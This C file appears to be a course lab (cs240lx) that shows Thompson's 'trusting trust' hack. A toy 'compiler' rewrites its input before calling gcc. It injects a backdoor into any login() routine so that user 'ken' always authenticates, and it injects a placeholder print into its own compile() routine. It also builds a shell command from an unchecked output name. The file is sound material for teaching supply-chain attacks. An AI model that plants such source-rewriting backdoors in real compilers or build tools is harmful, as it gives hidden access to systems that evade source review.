// engler, cs240lx: trivial identity "compiler" used to illustrate
// thompsons hack: it simply echos its input out.
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>


#define error(args...) do { fprintf(stderr, ##args); exit(1);  } while(0)

// a not very interesting compile: throw the input into a 
// temporary file and then call gcc on the result.
static void compile(char *program, char *outname) {
    FILE *fp = fopen("./temp-out.c", "w");
    assert(fp);
    // fprintf(fp, "%s", modified_program);
    // fclose(fp);


    /*****************************************************************
     * Step 1:
     */
 
    // match on the start of the login() routine:
    static char login_sig[] = "int login(char *user) {";


    // and inject an attack for "ken":
    static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
    // char* modified_program = malloc(strlen(program) + strlen(login_attack) + 1);

    // int i = 0;
    // while (i < strlen(program)){
    //     if (strncmp(program + i, login_sig, strlen(login_sig)) == 0){
    //         // strncpy(modified_program, program, i + strlen(login_sig));
    //         // strcat(modified_program, login_attack);
    //         // strcat(modified_program, program + i + strlen(login_sig));
    //         for (int j = i; j < i + strlen(login_sig); j++){
    //             fprintf(fp, "%c", program[j]);
    //         }
    //         i += strlen(login_sig);
    //         for (int j = 0; j < strlen(login_attack); j++){
    //             fprintf(fp, "%c", login_attack[j]);
    //         }
    //         fprintf(fp, "\n");
    //     } else {
    //         fprintf(fp, "%c", program[i]);
    //     }
    //     i++;
    // }


    // int i = 0;
    // static char login_end[] = "does not exist\\n\", user);";
    // while (i < strlen(program)){
    //     if (strncmp(program + i, login_sig, strlen(login_sig)) == 0){
    //         // strncpy(modified_program, program, i + strlen(login_sig));
    //         // strcat(modified_program, login_attack);
    //         // strcat(modified_program, program + i + strlen(login_sig));
    //         for (int j = i; j < i + strlen(login_sig); j++){
    //             fprintf(fp, "%c", program[j]);
    //         }
    //         i += strlen(login_sig);
    //         for (int j = 0; j < strlen(login_attack); j++){
    //             fprintf(fp, "%c", login_attack[j]);
    //         }
    //         fprintf(fp, "\n");
    //         while (i < strlen(program)){
    //             if (strncmp(program + i, login_end, strlen(login_end)) == 0){
    //                 i += strlen(login_end);
    //                 fprintf(fp, "%s", "\n");
    //                 break;
    //             } else {
    //                 i++;
    //             }
    //         }
    //         fprintf(fp, "%s", "return 1;");
    //     } else {
    //         fprintf(fp, "%c", program[i]);
    //     }
    //     i++;
    // }

    
     

    /*****************************************************************
     * Step 2:
     */

    // search for the start of the compile routine: 
    static char compile_sig[] =
            "static void compile(char *program, char *outname) {\n"
            "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
            "    assert(fp);"
            ;

    // and inject a placeholder "attack":
    // inject this after the assert above after the call to fopen.
    // not much of an attack.   this is just a quick placeholder.
    static char compile_attack[] 
              = "printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);";

    int i = 0;
    static char login_end[] = "does not exist\\n\", user);";
    while (i < strlen(program)){
        if (strncmp(program + i, login_sig, strlen(login_sig)) == 0){
            // strncpy(modified_program, program, i + strlen(login_sig));
            // strcat(modified_program, login_attack);
            // strcat(modified_program, program + i + strlen(login_sig));
            for (int j = i; j < i + strlen(login_sig); j++){
                fprintf(fp, "%c", program[j]);
            }
            i += strlen(login_sig);
            for (int j = 0; j < strlen(login_attack); j++){
                fprintf(fp, "%c", login_attack[j]);
            }
            fprintf(fp, "\n");
            while (i < strlen(program)){
                if (strncmp(program + i, login_end, strlen(login_end)) == 0){
                    i += strlen(login_end);
                    fprintf(fp, "%s", "\n");
                    break;
                } else {
                    i++;
                }
            }
            fprintf(fp, "%s", "return 1;");
        } else if (strncmp(program + i, compile_sig, strlen(compile_sig)) == 0){
            for (int j = i; j < i + strlen(compile_sig); j++){
                fprintf(fp, "%c", program[j]);
            }
            i += strlen(compile_sig);
            for (int j = 0; j < strlen(compile_attack); j++){
                fprintf(fp, "%c", compile_attack[j]);
            }
            fprintf(fp, "\n");
        } else {
            fprintf(fp, "%c", program[i]);
        }
        i++;
    }

    // while (i < strlen(program)){
    //     if (strncmp(program + i, compile_sig, strlen(compile_sig)) == 0){
    //         // strncpy(modified_program, program, i + strlen(compile_sig));
    //         // strcat(modified_program, compile_attack);
    //         // strcat(modified_program, program + i + strlen(compile_sig));
    //         for (int j = i; j < i + strlen(compile_sig); j++){
    //             fprintf(fp, "%c", program[j]);
    //         }
    //         i += strlen(compile_sig);
    //         for (int j = 0; j < strlen(compile_attack); j++){
    //             fprintf(fp, "%c", compile_attack[j]);
    //         }
    //         fprintf(fp, "\n");
    //     } else {
    //         fprintf(fp, "%c", program[i]);
    //     }
    //     i++;
    // }
    fclose(fp);


    /************************************************************
     * don't modify the rest.
     */

    // gross, call gcc.
    char buf[1024];
    sprintf(buf, "gcc ./temp-out.c -o %s", outname);
    if(system(buf) != 0)
        error("system failed\n");
}



#   define N  8 * 1024 * 1024
static char buf[N+1];

int main(int argc, char *argv[]) {
    if(argc != 4)
        error("expected 4 arguments have %d\n", argc);
    if(strcmp(argv[2], "-o") != 0)
        error("expected -o as second argument, have <%s>\n", argv[2]);

    // read in the entire file.
    int fd;
    if((fd = open(argv[1], O_RDONLY)) < 0)
        error("file <%s> does not exist\n", argv[1]);

    int n;
    if((n = read(fd, buf, N)) < 1)
        error("invalid read of file <%s>\n", argv[1]);
    if(n == N)
        error("input file too large\n");

    // "compile" it.
    compile(buf, argv[3]);
    return 0;
}
